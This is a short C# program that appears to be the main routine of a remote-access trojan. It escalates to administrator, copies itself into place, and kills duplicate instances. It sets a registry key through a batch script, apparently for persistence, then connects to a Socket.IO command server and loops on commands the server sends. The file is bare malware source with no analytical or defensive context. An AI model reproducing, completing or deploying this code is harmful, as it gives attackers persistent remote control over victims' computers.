
using CommonClassLibrary;
using Payload.Command;
using Payload.Core.Command;

new CallAdminFactory().CreateCommand().Execute();

if (Config.IsDebug() || !Config.Instance.IsUserAdministrator())
{
    Console.WriteLine("Safe Lock");
    return;
}

if (!Config.Instance.CheckWorkingTarget())
{
    CopyItselfCommand CopyItselfCommand = new CopyItselfFactory().CreateCommand();    
    CopyItselfCommand.Undo();
    CopyItselfCommand.Execute();
    new StartProcessBatFactory().CreateCommand().Execute();
    return;
}
new KillOtherMeFactory().CreateCommand().Execute();
new RegistryKeyBatFactory().CreateCommand().Execute();

var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);

while (true)
{
    CommandManager.Instance.Run();
    Thread.Sleep(Config.Instance.MainSleepInterval);
}